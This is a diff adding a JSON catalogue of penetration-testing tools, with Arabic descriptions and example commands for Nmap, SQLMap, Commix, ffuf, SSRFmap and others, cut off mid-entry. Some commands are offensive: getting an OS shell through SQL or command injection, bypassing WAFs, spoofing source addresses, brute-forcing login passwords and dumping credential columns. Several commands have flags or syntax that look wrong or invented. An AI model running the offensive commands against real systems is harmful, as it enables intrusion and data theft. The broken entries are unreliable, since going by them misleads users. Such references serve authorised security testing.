@@ -1,0 +1,1588 @@
+[
+  {
+    "id": 1,
+    "name": "Nmap",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "أقوى أداة لفحص الشبكات واكتشاف الأجهزة والمنافذ المفتوحة والخدمات وأنظمة التشغيل",
+    "tags": ["فحص شبكة", "منافذ", "اكتشاف أجهزة"],
+    "commands": [
+      { "title": "فحص أساسي لمنفذ واحد", "cmd": "nmap -p 80,443 <target>" },
+      { "title": "فحص جميع المنافذ 65535", "cmd": "nmap -p- <target>" },
+      { "title": "فحص مع اكتشاف الخدمات والإصدارات", "cmd": "nmap -sV <target>" },
+      { "title": "فحص مع اكتشاف نظام التشغيل", "cmd": "nmap -O <target>" },
+      { "title": "فحص شامل خدمات+نظام تشغيل+سكريبتات", "cmd": "nmap -A <target>" },
+      { "title": "فحص سريع أكثر 100 منفذ شائعة", "cmd": "nmap -F <target>" },
+      { "title": "فحص بدون إرسال حزم Stealth SYN", "cmd": "nmap -sS <target>" },
+      { "title": "فحص UDP", "cmd": "nmap -sU <target>" },
+      { "title": "فحص شبكة كاملة", "cmd": "nmap -sn 192.168.1.0/24" },
+      { "title": "فحص مع تجنب جدار الحماية", "cmd": "nmap -f <target>" },
+      { "title": "فحص بتزوير عنوان المصدر", "cmd": "nmap -S <spoofed_ip> <target>" },
+      { "title": "تشغيل سكريبتات الثغرات", "cmd": "nmap --script=vuln <target>" },
+      { "title": "فحص الثغرات والاستغلالات", "cmd": "nmap --script=vuln,exploit <target>" },
+      { "title": "تصدير XML", "cmd": "nmap -oX output.xml <target>" },
+      { "title": "تصدير Nmap Greppable", "cmd": "nmap -oG output.gnmap <target>" },
+      { "title": "فحص بسرعة T4", "cmd": "nmap -T4 <target>" },
+      { "title": "فحص مع استبعاد منافذ", "cmd": "nmap --exclude-ports 80,443 -p- <target>" },
+      { "title": "فحص IPv6", "cmd": "nmap -6 <target>" },
+      { "title": "اكتشاف أجهزة الشبكة فقط", "cmd": "nmap -sP 192.168.1.0/24" },
+      { "title": "فحص مع تحديد واجهة الشبكة", "cmd": "nmap -e eth0 <target>" },
+      { "title": "فحص SMB", "cmd": "nmap --script=smb-enum-shares,smb-enum-users <target>" },
+      { "title": "فحص HTTP", "cmd": "nmap --script=http-enum <target>" },
+      { "title": "فحص SSL/TLS", "cmd": "nmap --script=ssl-enum-ciphers -p 443 <target>" },
+      { "title": "فحص مع تحديد منافذ محددة من ملف", "cmd": "nmap -p iL ports.txt <target>" },
+      { "title": "فحص عدة أهداف من ملف", "cmd": "nmap -iL targets.txt" }
+    ]
+  },
+  {
+    "id": 2,
+    "name": "whois",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "أداة للاستعلام عن معلومات تسجيل النطاقات والمالكين",
+    "tags": ["نطاقات", "DNS", "OSINT"],
+    "commands": [
+      { "title": "استعلام أساسي عن نطاق", "cmd": "whois example.com" },
+      { "title": "استعلام عن IP", "cmd": "whois 192.168.1.1" },
+      { "title": "استعلام من خادم محدد", "cmd": "whois -h whois.iana.org example.com" },
+      { "title": "تصفية النتائج", "cmd": "whois example.com | grep -i 'Name Server'" }
+    ]
+  },
+  {
+    "id": 3,
+    "name": "dig",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "أداة متقدمة للاستعلام عن سجلات DNS بجميع أنواعها",
+    "tags": ["DNS", "سجلات", "استعلام"],
+    "commands": [
+      { "title": "استعلام A Record", "cmd": "dig example.com A" },
+      { "title": "استعلام جميع السجلات", "cmd": "dig example.com ANY" },
+      { "title": "استعلام MX خوادم البريد", "cmd": "dig example.com MX" },
+      { "title": "استعلام NS خوادم الأسماء", "cmd": "dig example.com NS" },
+      { "title": "استعلام TXT", "cmd": "dig example.com TXT" },
+      { "title": "استعلام من خادم DNS محدد", "cmd": "dig @8.8.8.8 example.com" },
+      { "title": "نقل منطقة DNS Zone Transfer", "cmd": "dig axfr example.com @ns1.example.com" },
+      { "title": "استعلام عكسي IP إلى نطاق", "cmd": "dig -x 192.168.1.1" },
+      { "title": "استعلام موجز", "cmd": "dig +short example.com" },
+      { "title": "تتبع مسار الاستعلام", "cmd": "dig +trace example.com" }
+    ]
+  },
+  {
+    "id": 4,
+    "name": "theHarvester",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "جمع المعلومات من محركات البحث والشبكات الاجتماعية عن نطاق معين",
+    "tags": ["OSINT", "بريد إلكتروني", "محركات بحث"],
+    "commands": [
+      { "title": "جمع معلومات من جميع المصادر", "cmd": "theHarvester -d example.com -b all" },
+      { "title": "جمع من جوجل فقط", "cmd": "theHarvester -d example.com -b google" },
+      { "title": "جمع من لينكدإن", "cmd": "theHarvester -d example.com -b linkedin" },
+      { "title": "تحديد عدد النتائج", "cmd": "theHarvester -d example.com -b all -l 500" },
+      { "title": "تصدير HTML", "cmd": "theHarvester -d example.com -b all -f output.html" },
+      { "title": "استخدام بروكسي", "cmd": "theHarvester -d example.com -b all --proxy 127.0.0.1:8080" }
+    ]
+  },
+  {
+    "id": 5,
+    "name": "Maltego",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "أداة OSINT متقدمة لتحليل الروابط والعلاقات بين الكيانات الرقمية",
+    "tags": ["OSINT", "تحليل روابط", "رسم بياني"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "maltego" },
+      { "title": "استيراد قائمة نطاقات", "cmd": "maltego -import domains.txt" },
+      { "title": "تصدير الرسم البياني", "cmd": "maltego -export graph.png" }
+    ]
+  },
+  {
+    "id": 6,
+    "name": "Recon-ng",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "إطار عمل قوي لجمع المعلومات عبر وحدات نمطية",
+    "tags": ["OSINT", "إطار عمل", "وحدات"],
+    "commands": [
+      { "title": "تشغيل Recon-ng", "cmd": "recon-ng" },
+      { "title": "عرض الوحدات المتاحة", "cmd": "marketplace search" },
+      { "title": "تثبيت وحدة", "cmd": "marketplace install recon/domains-hosts/hackertarget" },
+      { "title": "تحميل وحدة", "cmd": "modules load recon/domains-hosts/hackertarget" },
+      { "title": "تعيين النطاق", "cmd": "options set SOURCE example.com" },
+      { "title": "تشغيل الوحدة", "cmd": "run" },
+      { "title": "عرض نتائج الوحدة", "cmd": "show" },
+      { "title": "بحث في الوحدات", "cmd": "modules search recon/domains" }
+    ]
+  },
+  {
+    "id": 7,
+    "name": "Shodan CLI",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "واجهة سطر أوامر لمحرك Shodan لاكتشاف الأجهزة المتصلة بالإنترنت",
+    "tags": ["IoT", "محرك بحث", "أجهزة متصلة"],
+    "commands": [
+      { "title": "تهيئة مفتاح API", "cmd": "shodan init YOUR_API_KEY" },
+      { "title": "بحث عن نطاق", "cmd": "shodan host example.com" },
+      { "title": "بحث بكلمات مفتاحية", "cmd": "shodan search \"apache\" --limit 10" },
+      { "title": "عدد النتائج لاستعلام", "cmd": "shodan count \"port:22 country:US\"" },
+      { "title": "فحص IP الخاص بك", "cmd": "shodan myip" },
+      { "title": "تحليل نتائج فحص", "cmd": "shodan parse --fields ip_str,port,org scan.json" },
+      { "title": "مراقبة شبكة", "cmd": "shodan monitor 1.2.3.0/24" }
+    ]
+  },
+  {
+    "id": 8,
+    "name": "Amass",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "أداة متقدمة لاكتشاف النطاقات الفرعية عبر أساليب متعددة",
+    "tags": ["نطاقات فرعية", "DNS", "اكتشاف"],
+    "commands": [
+      { "title": "اكتشاف النطاقات الفرعية", "cmd": "amass enum -d example.com" },
+      { "title": "اكتشاف نشط مع brute force", "cmd": "amass enum -active -d example.com" },
+      { "title": "استخدام خوادم DNS محددة", "cmd": "amass enum -d example.com -r 8.8.8.8,1.1.1.1" },
+      { "title": "تصدير النتائج", "cmd": "amass enum -d example.com -o subs.txt" },
+      { "title": "تصور العلاقات", "cmd": "amass viz -d example.com" },
+      { "title": "فحص عبر APIs", "cmd": "amass enum -d example.com -brute" },
+      { "title": "تحديد عمق البحث", "cmd": "amass enum -d example.com -depth 5" }
+    ]
+  },
+  {
+    "id": 9,
+    "name": "Sublist3r",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "أداة سريعة لاكتشاف النطاقات الفرعية باستخدام محركات البحث",
+    "tags": ["نطاقات فرعية", "محركات بحث"],
+    "commands": [
+      { "title": "اكتشاف أساسي", "cmd": "sublist3r -d example.com" },
+      { "title": "مع brute force", "cmd": "sublist3r -d example.com -b" },
+      { "title": "تحديد منافذ", "cmd": "sublist3r -d example.com -p 80,443" },
+      { "title": "تصدير النتائج", "cmd": "sublist3r -d example.com -o output.txt" },
+      { "title": "تحديد عدد الخيوط", "cmd": "sublist3r -d example.com -t 50" }
+    ]
+  },
+  {
+    "id": 10,
+    "name": "SpiderFoot",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "أتمتة جمع المعلومات عبر أكثر من 200 وحدة بيانات",
+    "tags": ["OSINT", "أتمتة", "شامل"],
+    "commands": [
+      { "title": "تشغيل واجهة الويب", "cmd": "spiderfoot -l 127.0.0.1:5001" },
+      { "title": "فحص من سطر الأوامر", "cmd": "spiderfoot -s example.com -t all" },
+      { "title": "تحديد وحدات محددة", "cmd": "spiderfoot -s example.com -m sfp_dns,sfp_whois" },
+      { "title": "تصدير CSV", "cmd": "spiderfoot -s example.com -t all --format csv -o out.csv" }
+    ]
+  },
+  {
+    "id": 11,
+    "name": "DNSrecon",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "أداة شاملة لتقييم DNS واكتشاف السجلات والنطاقات الفرعية",
+    "tags": ["DNS", "سجلات", "نطاقات فرعية"],
+    "commands": [
+      { "title": "فحص شامل", "cmd": "dnsrecon -d example.com" },
+      { "title": "محاولة Zone Transfer", "cmd": "dnsrecon -d example.com -t axfr" },
+      { "title": "brute force للنطاقات الفرعية", "cmd": "dnsrecon -d example.com -t brt -D wordlist.txt" },
+      { "title": "فحص عكسي", "cmd": "dnsrecon -r 192.168.1.0/24" },
+      { "title": "Cache Snooping", "cmd": "dnsrecon -t snoop -n 8.8.8.8 -D wordlist.txt" },
+      { "title": "فحص SRV Records", "cmd": "dnsrecon -d example.com -t srv" }
+    ]
+  },
+  {
+    "id": 12,
+    "name": "fierce",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "فحص DNS مع محاولة Zone Transfer و brute force",
+    "tags": ["DNS", "Zone Transfer"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "fierce --domain example.com" },
+      { "title": "مع قائمة كلمات مخصصة", "cmd": "fierce --domain example.com --wordlist mylist.txt" },
+      { "title": "تحديد خادم DNS", "cmd": "fierce --domain example.com --dns-servers ns1.example.com" }
+    ]
+  },
+  {
+    "id": 13,
+    "name": "WhatWeb",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "linux",
+    "description": "تحديد التقنيات المستخدمة في موقع ويب",
+    "tags": ["تحديد تقنيات", "ويب", "بصمة"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "whatweb example.com" },
+      { "title": "فحص سريع", "cmd": "whatweb -a 1 example.com" },
+      { "title": "فحص شامل", "cmd": "whatweb -a 3 example.com" },
+      { "title": "تصدير JSON", "cmd": "whatweb -o json output.json example.com" },
+      { "title": "فحص عدة مواقع", "cmd": "whatweb -i urls.txt" }
+    ]
+  },
+  {
+    "id": 14,
+    "name": "Wappalyzer CLI",
+    "category": "recon",
+    "categoryName": "جمع المعلومات",
+    "catIcon": "fa-magnifying-glass",
+    "catColor": 0,
+    "os": "cross",
+    "description": "تحديد حزم التقنيات المستخدمة في المواقع",
+    "tags": ["تقنيات", "ويب", "تحليل"],
+    "commands": [
+      { "title": "تحليل موقع", "cmd": "wappalyzer example.com" },
+      { "title": "تحليل مع JSON", "cmd": "wappalyzer --output json example.com" },
+      { "title": "تحليل عدة مواقع", "cmd": "wappalyzer -i urls.txt" }
+    ]
+  },
+  {
+    "id": 15,
+    "name": "Nessus",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "cross",
+    "description": "أشهر أداة لفحص الثغرات بشكل شامل مع قاعدة بيانات ضخمة",
+    "tags": ["فحص ثغرات", "شامل", "تجاري"],
+    "commands": [
+      { "title": "تشغيل خدمة Nessus", "cmd": "/opt/nessus/sbin/nessus-service start" },
+      { "title": "فحص شبكة", "cmd": "nessuscli scan --targets 192.168.1.0/24 --policy \"Basic Network Scan\"" },
+      { "title": "تصدير التقرير PDF", "cmd": "nessuscli report --scan-id 123 --format pdf --output report.pdf" },
+      { "title": "قائمة الفحوصات", "cmd": "nessuscli scan --list" },
+      { "title": "تحديث المكونات", "cmd": "nessuscli update --all" }
+    ]
+  },
+  {
+    "id": 16,
+    "name": "OpenVAS",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "linux",
+    "description": "فاحص ثغرات مفتوح المصدر قوي يشبه Nessus",
+    "tags": ["فحص ثغرات", "مفتوح المصدر", "شامل"],
+    "commands": [
+      { "title": "تهيئة GVM", "cmd": "gvm-setup" },
+      { "title": "التحقق من التثبيت", "cmd": "gvm-check-setup" },
+      { "title": "بدء GVM", "cmd": "gvm-start" },
+      { "title": "تحديث قاعدة البيانات", "cmd": "greenbone-nvt-sync" },
+      { "title": "فحص من سطر الأوامر", "cmd": "gvm-cli scan --target 192.168.1.0/24" }
+    ]
+  },
+  {
+    "id": 17,
+    "name": "Nikto",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "linux",
+    "description": "فاحص ثغرات خوادم الويب يكتشف الملفات الخطرة والإعدادات الخاطئة",
+    "tags": ["ويب", "خوادم", "ثغرات"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "nikto -h example.com" },
+      { "title": "فحص منفذ محدد", "cmd": "nikto -h example.com -p 8080" },
+      { "title": "فحص HTTPS", "cmd": "nikto -h https://example.com" },
+      { "title": "حفظ HTML", "cmd": "nikto -h example.com -o report.html -Format htm" },
+      { "title": "حفظ CSV", "cmd": "nikto -h example.com -o report.csv -Format csv" },
+      { "title": "تحديث قاعدة البيانات", "cmd": "nikto -update" },
+      { "title": "فحص عدة مواقع", "cmd": "nikto -h hosts.txt" },
+      { "title": "استبعاد فحوصات", "cmd": "nikto -h example.com -Tuning 123" },
+      { "title": "استخدام بروكسي", "cmd": "nikto -h example.com -useproxy http://127.0.0.1:8080" }
+    ]
+  },
+  {
+    "id": 18,
+    "name": "Nuclei",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "cross",
+    "description": "فاحص ثغرات سريع يعتمد على قوالب YAML لاكتشاف ثغرات محددة",
+    "tags": ["قوالب", "سريع", "ثغرات"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "nuclei -u example.com" },
+      { "title": "فحص عدة أهداف", "cmd": "nuclei -l urls.txt" },
+      { "title": "تحديث القوالب", "cmd": "nuclei -ut" },
+      { "title": "استخدام قوالب محددة", "cmd": "nuclei -u example.com -t cves/" },
+      { "title": "فحص CVE محدد", "cmd": "nuclei -u example.com -t cves/2021/CVE-2021-44228.yaml" },
+      { "title": "تصدير JSON", "cmd": "nuclei -u example.com -o results.json -json" },
+      { "title": "تحديد معدل الطلبات", "cmd": "nuclei -u example.com -rl 50" },
+      { "title": "فحص النطاق الفرعي", "cmd": "nuclei -d example.com" },
+      { "title": "وضع الصمت", "cmd": "nuclei -u example.com -silent" }
+    ]
+  },
+  {
+    "id": 19,
+    "name": "OWASP ZAP",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "cross",
+    "description": "فاحص ثغرات تطبيقات الويب المتكامل من OWASP",
+    "tags": ["ويب", "OWASP", "شامل", "proxy"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "zap" },
+      { "title": "فحص سريع", "cmd": "zap-cli quick-scan http://example.com" },
+      { "title": "فحص شامل", "cmd": "zap-cli full-scan http://example.com" },
+      { "title": "فحص نشط", "cmd": "zap-cli active-scan http://example.com" },
+      { "title": "زحف الويب Spider", "cmd": "zap-cli spider http://example.com" },
+      { "title": "تصدير التقرير", "cmd": "zap-cli report -o report.html -f html" },
+      { "title": "بدء كـ Proxy", "cmd": "zap-cli start --daemon" },
+      { "title": "تحديد المنفذ", "cmd": "zap-cli start -p 8888" }
+    ]
+  },
+  {
+    "id": 20,
+    "name": "Arachni",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "linux",
+    "description": "فاحص ثغرات ويب متقدم يدعم الأسكربتات",
+    "tags": ["ويب", "ثغرات", "متقدم"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "arachni http://example.com" },
+      { "title": "فحص مع تقرير HTML", "cmd": "arachni http://example.com --report=html:report.html" },
+      { "title": "تحديد عمق الزحف", "cmd": "arachni http://example.com --depth=5" },
+      { "title": "استبعاد مسارات", "cmd": "arachni http://example.com --exclude=/admin/" },
+      { "title": "فحص مع مصادقة", "cmd": "arachni http://example.com --login-url=/login --login-username=admin --login-password=pass" }
+    ]
+  },
+  {
+    "id": 21,
+    "name": "Wfuzz",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "linux",
+    "description": "أداة fuzzing لتطبيقات الويب لاختبار المدخلات واكتشاف الملفات المخفية",
+    "tags": ["fuzzing", "ويب", "اكتشاف"],
+    "commands": [
+      { "title": "اكتشاف ملفات ومجلدات", "cmd": "wfuzz -c -z file,wordlist.txt --hc 404 http://example.com/FUZZ" },
+      { "title": "فحص معلمات", "cmd": "wfuzz -c -z file,wordlist.txt http://example.com/page?id=FUZZ" },
+      { "title": "تصفية بحجم الاستجابة", "cmd": "wfuzz -c -z file,wordlist.txt --hh 1234 http://example.com/FUZZ" },
+      { "title": "فحص رؤوس HTTP", "cmd": "wfuzz -c -z file,headers.txt -H \"X-Test: FUZZ\" http://example.com" },
+      { "title": "تحديد عدد الخيوط", "cmd": "wfuzz -c -t 50 -z file,wordlist.txt http://example.com/FUZZ" },
+      { "title": "فحص نطاقات فرعية", "cmd": "wfuzz -c -z file,subs.txt --hc 404 http://FUZZ.example.com" }
+    ]
+  },
+  {
+    "id": 22,
+    "name": "ffuf",
+    "category": "vuln",
+    "categoryName": "فحص الثغرات",
+    "catIcon": "fa-bug",
+    "catColor": 1,
+    "os": "cross",
+    "description": "أداة fuzzing ويب سريعة جدا مكتوبة بـ Go",
+    "tags": ["fuzzing", "سريع", "ويب"],
+    "commands": [
+      { "title": "اكتشاف مجلدات", "cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt" },
+      { "title": "تصفية حسب الكود", "cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt -fc 404" },
+      { "title": "تصفية بحجم الاستجابة", "cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt -fs 1234" },
+      { "title": "فحص معلمات POST", "cmd": "ffuf -u http://example.com/login -X POST -d \"user=admin&pass=FUZZ\" -w wordlist.txt" },
+      { "title": "فحص نطاقات فرعية", "cmd": "ffuf -u http://FUZZ.example.com -w subs.txt" },
+      { "title": "تحديد خيوط", "cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt -t 100" },
+      { "title": "فحص رأس Host", "cmd": "ffuf -u http://example.com -H \"Host: FUZZ.example.com\" -w subs.txt" },
+      { "title": "تصدير JSON", "cmd": "ffuf -u http://example.com/FUZZ -w wordlist.txt -o results.json" }
+    ]
+  },
+  {
+    "id": 23,
+    "name": "SQLMap",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة آلية لاكتشاف واستغلال ثغرات حقن SQL بجميع أنواعها",
+    "tags": ["SQL Injection", "قواعد بيانات", "استغلال"],
+    "commands": [
+      { "title": "كشف ثغرة SQL في GET", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --dbs" },
+      { "title": "استخراج جداول قاعدة بيانات", "cmd": "sqlmap -u \"http://example.com/page?id=1\" -D dbname --tables" },
+      { "title": "استخراج أعمدة جدول", "cmd": "sqlmap -u \"http://example.com/page?id=1\" -D dbname -T users --columns" },
+      { "title": "استخراج بيانات من جدول", "cmd": "sqlmap -u \"http://example.com/page?id=1\" -D dbname -T users -C \"username,password\" --dump" },
+      { "title": "حقن POST", "cmd": "sqlmap -u \"http://example.com/login\" --data=\"user=admin&pass=test\" --dbs" },
+      { "title": "حقن من ملف طلبات", "cmd": "sqlmap -r request.txt --dbs" },
+      { "title": "مستوى عالي وخطورة عالية", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --level=5 --risk=3 --dbs" },
+      { "title": "استخدام بروكسي", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --proxy=http://127.0.0.1:8080 --dbs" },
+      { "title": "تخطي WAF", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --tamper=space2comment --dbs" },
+      { "title": "حقن ملفات تعريف الارتباط", "cmd": "sqlmap -u \"http://example.com/page\" --cookie=\"id=1*\" --dbs" },
+      { "title": "الحصول على shell", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --os-shell" },
+      { "title": "كشف المستخدم الحالي", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --current-user" },
+      { "title": "batch mode بدون أسئلة", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --batch --dbs" },
+      { "title": "tamper scripts متعددة", "cmd": "sqlmap -u \"http://example.com/page?id=1\" --tamper=between,randomcase --dbs" }
+    ]
+  },
+  {
+    "id": 24,
+    "name": "Burp Suite",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "cross",
+    "description": "المنصة الأشهر لاختبار أمان تطبيقات الويب مع Proxy وScanner وIntruder",
+    "tags": ["proxy", "ويب", "شامل", "اعتراض"],
+    "commands": [
+      { "title": "تشغيل Burp", "cmd": "java -jar burpsuite.jar" },
+      { "title": "تحميل مشروع", "cmd": "java -jar burpsuite.jar --project-file=myproject.burp" },
+      { "title": "تحديد ذاكرة", "cmd": "java -Xmx2048m -jar burpsuite.jar" },
+      { "title": "Community Edition", "cmd": "burpsuite" }
+    ]
+  },
+  {
+    "id": 25,
+    "name": "XSStrike",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة متقدمة لاكتشاف واستغلال ثغرات XSS مع fuzzing ذكي",
+    "tags": ["XSS", "حقن", "جافاسكربت"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "xsstrike -u \"http://example.com/search?q=test\"" },
+      { "title": "فحص مع fuzzing", "cmd": "xsstrike -u \"http://example.com/search?q=test\" -f" },
+      { "title": "فحص مع crawl", "cmd": "xsstrike -u \"http://example.com\" --crawl" },
+      { "title": "تحديد معاملات", "cmd": "xsstrike -u \"http://example.com/search?q=test\" -p q" },
+      { "title": "تشفير الـ payload", "cmd": "xsstrike -u \"http://example.com/search?q=test\" --encode" }
+    ]
+  },
+  {
+    "id": 26,
+    "name": "Commix",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة لاستغلال ثغرات حقن الأوامر Command Injection",
+    "tags": ["Command Injection", "أوامر", "استغلال"],
+    "commands": [
+      { "title": "كشف حقن الأوامر", "cmd": "commix --url=\"http://example.com/page?cmd=test\"" },
+      { "title": "حقن POST", "cmd": "commix --url=\"http://example.com/page\" --data=\"cmd=test\"" },
+      { "title": "من ملف طلبات", "cmd": "commix --request=request.txt" },
+      { "title": "تخطي WAF", "cmd": "commix --url=\"http://example.com/page?cmd=test\" --tamper=space2tab" },
+      { "title": "الحصول على shell تفاعلي", "cmd": "commix --url=\"http://example.com/page?cmd=test\" --os-shell" }
+    ]
+  },
+  {
+    "id": 27,
+    "name": "SSRFmap",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة لاستغلال ثغرات SSRF لاكتشاف خدمات داخلية",
+    "tags": ["SSRF", "خدمات داخلية", "استغلال"],
+    "commands": [
+      { "title": "فحص أساسي", "cmd": "python3 ssrfmap.py -r request.txt -p url" },
+      { "title": "فحص منافذ داخلية", "cmd": "python3 ssrfmap.py -r request.txt -p url -m portscan" },
+      { "title": "قراءة ملفات", "cmd": "python3 ssrfmap.py -r request.txt -p url -m readfiles" },
+      { "title": "فحص الخدمات", "cmd": "python3 ssrfmap.py -r request.txt -p url -m redis,mysql" }
+    ]
+  },
+  {
+    "id": 28,
+    "name": "NoSQLMap",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة لاكتشاف واستغلال ثغرات حقن NoSQL",
+    "tags": ["NoSQL", "MongoDB", "حقن"],
+    "commands": [
+      { "title": "تشغيل الواجهة", "cmd": "nosqlmap" },
+      { "title": "فحص تلقائي", "cmd": "nosqlmap -u \"http://example.com/login\" --attack 1" },
+      { "title": "استخراج قاعدة بيانات", "cmd": "nosqlmap -u \"http://example.com/api\" --attack 3" },
+      { "title": "حقن MongoDB", "cmd": "nosqlmap -u \"http://example.com/api\" --dbms mongo" }
+    ]
+  },
+  {
+    "id": 29,
+    "name": "JWT Tool",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "linux",
+    "description": "أداة شاملة لاختبار أمان رموز JWT",
+    "tags": ["JWT", "مصادقة", "توكنات"],
+    "commands": [
+      { "title": "تحليل توكن", "cmd": "python3 jwt_tool.py <token>" },
+      { "title": "فحص جميع الثغرات", "cmd": "python3 jwt_tool.py <token> -M at" },
+      { "title": "تزوير payload", "cmd": "python3 jwt_tool.py <token> -T" },
+      { "title": "حقن مفتاح", "cmd": "python3 jwt_tool.py <token> -C -d dictionary.txt" },
+      { "title": "فحص none algorithm", "cmd": "python3 jwt_tool.py <token> -X a" }
+    ]
+  },
+  {
+    "id": 30,
+    "name": "DirBuster",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "cross",
+    "description": "اكتشاف المجلدات والملفات المخفية في خوادم الويب",
+    "tags": ["اكتشاف ملفات", "مجلدات", "brute force"],
+    "commands": [
+      { "title": "تشغيل واجهة رسومية", "cmd": "dirbuster" },
+      { "title": "من سطر الأوامر", "cmd": "dirbuster -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" },
+      { "title": "تحديد إعدادات", "cmd": "dirbuster -u http://example.com -w wordlist.txt -t 50 -r" }
+    ]
+  },
+  {
+    "id": 31,
+    "name": "Gobuster",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "cross",
+    "description": "أداة سريعة لاكتشاف المجلدات والنطاقات الفرعية وملفات DNS",
+    "tags": ["اكتشاف", "سريع", "مجلدات"],
+    "commands": [
+      { "title": "اكتشاف مجلدات", "cmd": "gobuster dir -u http://example.com -w wordlist.txt" },
+      { "title": "اكتشاف نطاقات فرعية", "cmd": "gobuster dns -d example.com -w subs.txt" },
+      { "title": "اكتشاف VHOSTs", "cmd": "gobuster vhost -u http://example.com -w vhosts.txt" },
+      { "title": "تحديد إعدادات وامتدادات", "cmd": "gobuster dir -u http://example.com -w wordlist.txt -t 50 -x php,html,js" },
+      { "title": "تصفية حسب الكود", "cmd": "gobuster dir -u http://example.com -w wordlist.txt -s \"200,301\"" },
+      { "title": "استخدام ملفات تعريف الارتباط", "cmd": "gobuster dir -u http://example.com -w wordlist.txt -c \"session=abc\"" },
+      { "title": "تصدير JSON", "cmd": "gobuster dir -u http://example.com -w wordlist.txt -o results.json" }
+    ]
+  },
+  {
+    "id": 32,
+    "name": "Feroxbuster",
+    "category": "web",
+    "categoryName": "اختبار تطبيقات الويب",
+    "catIcon": "fa-globe",
+    "catColor": 2,
+    "os": "cross",
+    "description": "أداة اكتشاف محتوى ويب سريعة مع recursion تلقائي",
